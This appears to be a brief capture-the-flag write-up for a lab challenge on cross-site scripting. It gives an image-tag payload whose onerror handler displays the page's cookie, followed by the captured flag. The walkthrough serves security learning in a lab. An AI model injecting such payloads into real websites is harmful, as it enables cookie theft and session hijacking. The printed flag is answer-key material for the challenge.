## Challenge

To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url. 

## Solution

I added the following ath the input field:

```js
<img src="test" onerror=alert(document.cookie)>
```

So I look for an image name `test` and if it doesn't exist, it will print me the cookie, which it did:

`HTB{pur3ly_cl13n7_51d3}`